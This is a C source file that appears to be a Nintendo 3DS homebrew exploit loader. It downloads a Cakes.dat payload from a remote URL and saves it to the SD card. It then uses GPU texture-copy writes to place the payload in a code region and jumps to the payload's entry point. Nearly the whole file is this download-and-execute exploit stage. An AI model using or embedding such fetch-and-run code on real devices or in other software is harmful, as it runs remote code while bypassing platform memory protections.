#include "spiderdl.h"
#include "common.h"
#include "rop3ds/rop.h"

int main()
{
	const char* url = "http://dukesrg.github.io/Cakes.dat";
	const wchar_t* filename = L"dmc:/Cakes.dat";

	Handle httpcHandle = 0;
	httpcInit(&httpcHandle);
	downloadFile(httpcHandle, url, filename);
	httpcExit(&httpcHandle);

	IFILE file;
	unsigned int readBytes;

	_memset(&file, 0, sizeof(IFILE));
	IFile_Open(&file, filename, FILE_READ);

	IFile_Read(&file, &readBytes, (void*)BUFFER_LOC, 0x4000);

	GSPGPU_FlushDataCache((void*)BUFFER_LOC, 0x4000);
	GX_SetTextureCopy((void*)BUFFER_LOC, (void*)CODE_TARGET, 0x4000, 0, 0, 0, 0, 8);
	svcSleepThread(0x3B9ACA00LL);

	for(int i = 0; i < 3; i++) // do 3 times to be safe
	{
		GSPGPU_FlushDataCache((void*)0x18000000, 0x00038400);
		GX_SetTextureCopy((void*)0x18000000, (void*)0x1F48F000, 0x00038400, 0, 0, 0, 0, 8);
		svcSleepThread(0x400000LL);
		GSPGPU_FlushDataCache((void*)0x18000000, 0x00038400);
		GX_SetTextureCopy((void*)0x18000000, (void*)0x1F4C7800, 0x00038400, 0, 0, 0, 0, 8);
		svcSleepThread(0x400000LL);
	}

	((void(*)())CODE_ENTRY)();
	return 0;
}
